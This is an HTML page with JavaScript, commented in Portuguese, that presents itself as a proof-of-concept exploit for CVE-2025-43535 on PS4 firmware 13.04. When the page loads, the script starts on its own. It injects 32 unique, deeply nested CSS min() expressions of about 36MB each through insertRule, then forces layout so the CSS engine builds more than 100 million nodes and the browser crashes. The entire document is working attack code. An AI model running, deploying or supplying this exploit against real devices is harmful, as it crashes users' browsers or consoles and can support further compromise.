<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CVE-2025-43535 — Unique Chunking</title>
<style>
  body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
  #log { background:#111; border:1px solid #88ff88; padding:12px; height:320px; overflow-y:auto; font-size:12px; }
  .ok{color:#00ff88} .fail{color:#ff4444} .warn{color:#ffbb00} .crash{color:#ff00ff;font-weight:bold}
</style>
</head>
<body>
<div>CVE-2025-43535 · Bypass de Cache · PS4 FW 13.04</div>
<div id="log"></div>
<div id="stage" style="visibility:hidden"></div>

<script>
"use strict";

const L = (m, c) => {
  const d = document.getElementById('log');
  d.innerHTML += `<div class="${c||'info'}">[${Date.now()%100000}] ${m}</div>`;
  d.scrollTop = d.scrollHeight;
};

// Respiro para o Garbage Collector limpar as strings do JS
const yieldGC = () => new Promise(r => setTimeout(r, 150));

// A MÁGICA: O parâmetro 'baseVal' garante que nenhuma árvore seja igual à outra
function buildUniqueDepth(depth, baseVal) {
  let e = baseVal + 'px'; // Ex: 1px, 2px, 3px...
  for (let d = 1; d <= depth; d++) {
    e = 'min(' + e + ',' + e + ')';
  }
  return e;
}

async function run() {
  L('Iniciando Ataque por Fragmentação Única...', 'warn');

  // Criamos uma única stylesheet no DOM para receber os blocos
  const styleEl = document.createElement('style');
  document.head.appendChild(styleEl);
  const sheet = styleEl.sheet;

  // 32 blocos * 4.19M nós = ~134 Milhões de nós C++
  // Este valor garante que ultrapassamos o threshold de 119.5M do PS4
  const totalChunks = 32;

  for (let i = 1; i <= totalChunks; i++) {
    try {
      L(`[${i}/${totalChunks}] Alocando árvore única com base ${i}px...`);
      await new Promise(r => requestAnimationFrame(r)); // Atualiza o ecrã

      // 1. Gera a string exclusiva de ~36MB no JavaScript
      let uniquePayload = buildUniqueDepth(22, i);

      // 2. Injeta diretamente no motor CSS (Parser C++)
      // O insertRule devora a regra sem encher o HTML de texto
      sheet.insertRule(`.t${i} { width: ${uniquePayload} }`, sheet.cssRules.length);

      // 3. Aplica o estilo a um elemento para instanciar a árvore no Heap
      const div = document.createElement('div');
      div.className = `t${i}`;
      document.getElementById('stage').appendChild(div);
      
      // Força o motor a processar os cálculos C++ instantaneamente
      void div.offsetWidth; 

      // 4. Limpa a variável agressivamente para manter a RAM do JS vazia
      uniquePayload = null;

      L(`[${i}/${totalChunks}] +4.19M nós processados com sucesso.`, 'ok');

      // Aguarda que o lixo do JS seja recolhido antes de continuar
      await yieldGC();

    } catch(e) {
      L(`Falha crítica no bloco ${i}: ${e}`, 'fail');
      break;
    }
  }

  L('Todas as injeções foram concluídas. Se o ecrã não apagou, o limite é superior.', 'info');
}

window.addEventListener('load', () => setTimeout(run, 500));
</script>
</body>
</html>
